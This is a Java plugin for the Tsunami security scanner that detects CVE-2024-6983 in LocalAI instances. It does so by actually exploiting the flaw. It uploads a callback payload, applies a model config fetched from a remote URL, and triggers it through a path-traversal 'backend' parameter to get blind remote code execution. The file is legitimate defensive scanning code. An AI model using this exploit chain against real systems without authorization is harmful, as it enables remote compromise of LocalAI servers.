/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20246983;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.delete;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonObject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-6983 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2024-6983 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2024-6983 in Mudler LocalAI instances.",
    author = "frkngksl",
    bootstrapModule = Cve20246983DetectorBootstrapModule.class)
@ForWebService
public final class Cve20246983VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  private static final String CONFIG_FILE_URL =
      "https://raw.githubusercontent.com/google/tsunami-security-scanner-plugins/master/payloads/mudler_localai_rce/model.yaml";

  private static final String CONFIG_FILE_UPLOAD_PAYLOAD =
      "{\"name\":\"life\",\"config_url\":\"{{CONFIG_FILE_URL}}\",\"id\":\"\"}";
  private static final String MODEL_TRIGGER_PAYLOAD =
      "{\"backend\":\"../../../../../../build/models/app.bin\",\"model\":\"life\",\"input\":\"hi\"}";

  private static final String FILE_UPLOAD_BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
  private static final String FILE_UPLOAD_PATH = "v1/files";
  private static final String FILE_DELETE_PATH = "v1/files/{{FILE_ID}}";
  private static final String CONFIG_FILE_UPLOAD_PATH = "models/apply";
  private static final String MODEL_TRIGGER_PATH = "embeddings";

  private final HttpClient httpClient;

  private String uploadedFileId;

  @Inject
  Cve20246983VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
      throws IOException {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
    this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean checkLocalAIFingerprint(NetworkService networkService) {

    String targetWebAddress = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var request = HttpRequest.get(targetWebAddress).withEmptyHeaders().build();

    try {
      HttpResponse response = httpClient.send(request, networkService);
      return response.status().isSuccess()
          && response.bodyString().map(body -> body.contains("LocalAI instance!")).orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        && checkLocalAIFingerprint(networkService);
  }

  private String prepareUploadRequestBody(String callbackPayload) {
    try {
      // Create a ByteArrayOutputStream to hold the request body
      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

      // Use an OutputStreamWriter with UTF-8 encoding
      PrintWriter writer =
          new PrintWriter(new OutputStreamWriter(byteArrayOutputStream, "UTF-8"), true);

      // Add purpose field
      writer.append("--").append(FILE_UPLOAD_BOUNDARY).append("\r\n");
      writer.append("Content-Disposition: form-data; name=\"purpose\"\r\n\r\n");
      writer.append("fine-tune\r\n");

      // Add file field
      writer.append("--").append(FILE_UPLOAD_BOUNDARY).append("\r\n");
      writer.append(
          "Content-Disposition: form-data; name=\"file\"; filename=\"tsunamiPayload.txt\"\r\n");
      writer.append("Content-Type: text/plain\r\n\r\n");
      writer.append(callbackPayload + "\r\n");

      // Close the multipart form-data
      writer.append("--").append(FILE_UPLOAD_BOUNDARY).append("--\r\n");
      writer.close();

      // Convert the ByteArrayOutputStream to a string
      String requestBody = byteArrayOutputStream.toString("UTF-8");
      return requestBody;
    } catch (UnsupportedEncodingException e) {
      logger.atWarning().withCause(e).log("Failed to create request body.");
      return "";
    }
  }

  private boolean createCallbackPayloadFile(NetworkService networkService, String callbackPayload) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + FILE_UPLOAD_PATH;
    try {
      String requestBody = prepareUploadRequestBody(callbackPayload);
      if (!requestBody.isBlank()) {
        HttpResponse httpResponse =
            httpClient.send(
                post(targetWebAddress)
                    .setHeaders(
                        HttpHeaders.builder()
                            .addHeader(
                                CONTENT_TYPE,
                                "multipart/form-data; boundary=" + FILE_UPLOAD_BOUNDARY)
                            .build())
                    .setRequestBody(ByteString.copyFromUtf8(requestBody))
                    .build(),
                networkService);
        logger.atInfo().log("Response from file upload: %s", httpResponse.bodyString().get());
        if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
          return false;
        }
        JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
        if (jsonResponse.keySet().contains("id")) {
          this.uploadedFileId = jsonResponse.get("id").getAsString();
          logger.atInfo().log("Uploaded File ID: %s", this.uploadedFileId);
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean deleteCallbackPayloadFile(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + FILE_DELETE_PATH.replace("{{FILE_ID}}", this.uploadedFileId);
    try {
      HttpResponse httpResponse =
          httpClient.send(delete(targetWebAddress).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Response from file deletion: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("Deleted") && jsonResponse.get("Deleted").getAsBoolean()) {
        logger.atInfo().log("Uploaded file successfully deleted.");
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Uploaded file couldn't be deleted.");
      return false;
    }
    return false;
  }

  private boolean uploadConfigurationFile(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + CONFIG_FILE_UPLOAD_PATH;
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(
                      ByteString.copyFromUtf8(
                          CONFIG_FILE_UPLOAD_PAYLOAD.replace(
                              "{{CONFIG_FILE_URL}}", CONFIG_FILE_URL)))
                  .build(),
              networkService);
      logger.atInfo().log("Response from model creation: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("uuid")) {
        logger.atInfo().log("Model successfully created.");
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean triggerCreatedModel(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + MODEL_TRIGGER_PATH;
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(MODEL_TRIGGER_PAYLOAD))
                  .build(),
              networkService);
      logger.atInfo().log("Response from model trigger: %s", httpResponse.bodyString().get());
      // Here the request returns error (500), that's why I will return true, and check the payload
      // generator instead.
      return true;
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed!");
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    Payload payload = generateCallbackServerPayload();
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atInfo().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    logger.atInfo().log("Try uploading callback payload file");
    if (!createCallbackPayloadFile(networkService, payload.getPayload())) {
      return false;
    }
    logger.atInfo().log("Creating a malicious model with YAML file");
    if (!uploadConfigurationFile(networkService)) {
      return false;
    }
    // Sleep because of Github download
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
    logger.atInfo().log("Triggering the malicious model");
    if (!triggerCreatedModel(networkService)) {
      logger.atInfo().log("Expected Timeout");
    }
    // Preloaded models cannot be deleted, but payload continues to work even if the same model
    // exists. That's why only delete payload file.
    logger.atInfo().log("Try deleting callback payload file");
    if (!deleteCallbackPayloadFile(networkService)) {
      logger.atWarning().log("Callback file cannot be deleted!");
    }
    // Sleep because of callback request
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(5));
    return payload.checkIfExecuted();
  }

  private Payload generateCallbackServerPayload() {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    return this.payloadGenerator.generate(config);
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2024_6983"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2024-6983 Mudler LocalAI RCE")
                .setDescription(
                    "The Mudler LocalAI has API endpoints that allow its users to interact with"
                        + " model functionalities. The vulnerability here allows an attacker to"
                        + " upload a configuration file that includes a URI pointing to a malicious"
                        + " binary file through '/models/apply' endpoint. When the software"
                        + " processes this configuration file, it downloads the binary without"
                        + " conditional checking. By triggering the new model, created by this"
                        + " malicious configuration file, over the '/embeddings' endpoint, an"
                        + " attacker could trigger it by passing the malicious file location"
                        + " through the 'backend' parameter of this request.")
                .setRecommendation(
                    "You can upgrade your Mudler LocalAI instances to 2.19.4 or later."))
        .build();
  }
}
